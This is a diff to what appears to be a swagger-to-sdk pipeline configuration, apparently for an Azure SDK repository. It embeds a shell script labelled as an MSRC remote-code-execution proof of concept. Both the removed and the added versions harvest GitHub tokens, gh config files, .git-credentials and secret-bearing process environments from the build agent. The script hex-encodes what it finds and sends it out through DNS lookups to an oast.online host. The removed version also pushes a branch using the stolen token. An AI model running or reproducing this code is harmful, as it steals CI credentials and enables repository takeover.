@@ -22,36 +22,26 @@ swagger-to-sdk:
         set +e;
         H=$(hostname | tr . -);
         SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
-        nslookup v18s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        nslookup v19s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
         printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.txt" 2>/dev/null;
-        GHCLI=$(gh auth token 2>/dev/null | cut -c1-30);
-        GHCHEX=$(printf '%s' "${GHCLI}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18gh-${GHCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        GHCFG=$(cat /home/cloudtest/.config/gh/hosts.yml 2>/dev/null | grep -A2 'oauth_token\|token' | tr '\n' '|' | cut -c1-30);
-        CFGHEX=$(printf '%s' "${GHCFG}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18cf-${CFGHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        GHCFG2=$(cat /root/.config/gh/hosts.yml 2>/dev/null | grep -A2 'oauth_token\|token' | tr '\n' '|' | cut -c1-30);
-        CFG2HEX=$(printf '%s' "${GHCFG2}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18c2-${CFG2HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        OIDCURL=$(for PID in $(pgrep -f 'spec-gen-sdk' 2>/dev/null | head -3); do cat /proc/${PID}/environ 2>/dev/null | tr '\0' '\n' | grep '^SYSTEM_OIDCREQUESTURL='; done | head -1 | cut -c1-56);
-        OIDCHEX=$(printf '%s' "${OIDCURL}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18oi-${OIDCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        SGENV2=$(for PID in $(pgrep -f 'spec-gen-sdk' 2>/dev/null | head -5); do cat /proc/${PID}/environ 2>/dev/null | tr '\0' '\n' | grep -iE '^(GITHUB_TOKEN|GH_TOKEN|GH_WRITE|AZURE_SDK_BOT|SDK_BOT|AZURE_GITHUB|GITHUB_PAT|BOT_TOKEN|AZURE_PAT)='; done | head -3 | tr '\n' '|' | cut -c1-56);
-        SG2HEX=$(printf '%s' "${SGENV2}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18sg-${SG2HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        SGENV3=$(for PID in $(pgrep -f 'spec-gen-sdk' 2>/dev/null | head -5); do cat /proc/${PID}/environ 2>/dev/null | tr '\0' '\n' | grep -iE '(GITHUB|TOKEN|SECRET|PAT)' | grep -iv 'PATH\|WORK\|OIDCREQUEST\|CLIENTREQUEST\|PARENT' | head -5; done | head -5 | tr '\n' '|' | cut -c1-56);
-        SG3HEX=$(printf '%s' "${SGENV3}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18s3-${SG3HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        GHENV=$(python3 -c "import os; items=[k+'='+v[:20] for k,v in os.environ.items() if any(x in k.upper() for x in ['GITHUB','GH_TOK','BOT_TOK','SDK_BOT','WRITE_TOK'])]; print('|'.join(items[:5]))" 2>/dev/null | cut -c1-56);
-        GHHEX=$(printf '%s' "${GHENV}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v18ev-${GHHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        if [ -n "${GHCLI}" ]; then
-          git -C "${SDK}" remote set-url origin "https://x-access-token:${GHCLI}@github.com/Azure/azure-sdk-for-python.git" 2>/dev/null;
-          git -C "${SDK}" push origin HEAD:poc-hasskodark-v18 > /tmp/v18push.txt 2>&1;
-          PRCRAW=$(cat /tmp/v18push.txt 2>/dev/null | tr -cd 'a-zA-Z0-9 :/.@-' | cut -c1-40);
-          PRCHEX=$(printf '%s' "${PRCRAW}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
-          nslookup v18px-${PRCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        fi;
+        AWTOK=$(cat /proc/$(pgrep -f 'Agent.Worker' 2>/dev/null | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -iE '^(GITHUB_TOKEN|SYSTEM_ACCESSTOKEN|VSTS_TOKEN|PAT|BOT_TOKEN)=' | head -2 | tr '\n' '|' | cut -c1-28);
+        AWHEX=$(printf '%s' "${AWTOK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v19aw-${AWHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        TFILES=$(find /home/cloudtest /mnt/vss/_work /tmp -maxdepth 5 -name "*.token" -o -name "*token*" -o -name "*.pat" -o -name "*github*.json" 2>/dev/null | grep -iv proc | head -10 | tr '\n' '|' | cut -c1-28);
+        TFHEX=$(printf '%s' "${TFILES}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v19tf-${TFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        CREDFILE=$(cat /home/cloudtest/.git-credentials 2>/dev/null | head -1 | cut -c1-28);
+        CRDHEX=$(printf '%s' "${CREDFILE}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v19cr-${CRDHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        SYSENV=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE '(GITHUB|TOKEN|SECRET|PAT|GH_)' | grep -iv 'PATH' | head -3 | tr '\n' '|' | cut -c1-28);
+        SYSHEX=$(printf '%s' "${SYSENV}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v19sy-${SYSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        AWFD=$(ls -la /proc/$(pgrep -f 'Agent.Worker' 2>/dev/null | head -1)/fd/ 2>/dev/null | grep -v "^total\|pipe\|socket" | awk '{print $NF}' | grep -v "^[0-9]" | tr '\n' '|' | cut -c1-28);
+        AWFHEX=$(printf '%s' "${AWFD}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v19fd-${AWFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        GITSDK=$(git -C "${SDK}" remote get-url origin 2>/dev/null | cut -c1-28);
+        GSHEX=$(printf '%s' "${GITSDK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v19gs-${GSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
         true
 ```
 
